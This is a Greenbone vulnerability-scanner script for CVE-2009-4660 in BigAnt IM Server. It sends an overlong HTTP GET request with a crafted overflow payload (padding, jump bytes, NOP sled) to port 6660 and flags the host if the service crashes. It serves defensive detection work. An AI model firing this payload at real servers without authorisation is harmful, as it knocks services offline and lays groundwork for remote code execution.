# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100278");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-10-01 18:57:31 +0200 (Thu, 01 Oct 2009)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2009-4660");
  script_name("BigAnt IM Server HTTP GET Request Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Buffer overflow");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("BigAnt_detect.nasl");
  script_require_ports("Services/BigAnt", 6660);
  script_mandatory_keys("bigant/server/detected");

  script_tag(name:"summary", value:"BigAnt IM Server is prone to a remote buffer-overflow
  vulnerability because it fails to perform adequate boundary checks on user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with
  the privileges of the user running the server. Failed exploit attempts will result in a
  denial-of-service condition.");

  script_tag(name:"affected", value:"BigAnt IM Server 2.50 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for details.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36407");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = service_get_port(default:6660, proto:"BigAnt");

payload =  crap(data:raw_string(0x41), length:985);
payload += raw_string(0xeb, 0x06, 0x90, 0x90, 0x6a, 0x19, 0x9a, 0x0f);
payload += crap(data:raw_string(0x90),length:10);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

req = string("GET ", payload, "\r\n\r\n");
send(socket:soc, data:req);
close(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(0);